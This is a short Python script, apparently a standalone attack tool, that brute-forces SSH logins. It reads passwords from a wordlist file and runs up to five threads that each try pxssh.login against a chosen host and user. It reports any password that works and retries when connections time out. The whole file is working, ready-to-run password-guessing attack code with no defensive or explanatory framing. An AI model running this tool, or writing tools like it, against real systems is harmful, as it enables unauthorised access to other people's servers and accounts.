#!/usr/bin/env python

import optparse
import pexpect.pxssh as pxssh
import queue
import threading
import time


MAX_CONNECTIONS = 5
MAX_FAILS = 5

connection_lock = threading.BoundedSemaphore(value=MAX_CONNECTIONS)


def connect(host, user, password, release, found, fails):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)

        print(f"[+] Password found: {password}")

        found.put(password)
    except pxssh.ExceptionPxssh as e:
        if "read_nonblocking" in str(e):
            time.sleep(5)
            connect(host, user, password, False, found, fails)
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host, user, password, False, found, fails)
        elif "Could not establish connection to host" in str(e):
            try:
                fails.put_nowait(True)
            except queue.Full as e:
                pass
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser("usage: %prog -u <user> -h <host> -p <port>")

    parser.add_option("-u", dest="user", type="string", help="specify SSH user")
    parser.add_option("-H", dest="host", type="string", help="specify SSH host")
    parser.add_option("-P", dest="port", type="string", help="specify SSH port")
    parser.add_option("-f", dest="password_file", type="string", help="specify your passwords file")

    options, ags = parser.parse_args()

    user = options.user
    host = options.host
    port = options.port
    password_file = options.password_file

    found = queue.Queue(maxsize=1)
    fails = queue.Queue(maxsize=MAX_FAILS)

    with open(password_file, 'r') as f:
        for line in f.readlines():
            if not found.empty():
                print("[+] Exiting: password found")
                exit(0)

            if fails.full():
                print("[-] Exiting: could not establish connection to host")

                exit(1)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')

            print(f"[*] Testing: {str(password)}")
            t = threading.Thread(target=connect, args=(host, user, password, True, found, fails))
            child = t.start()


if __name__ == '__main__':
    main()
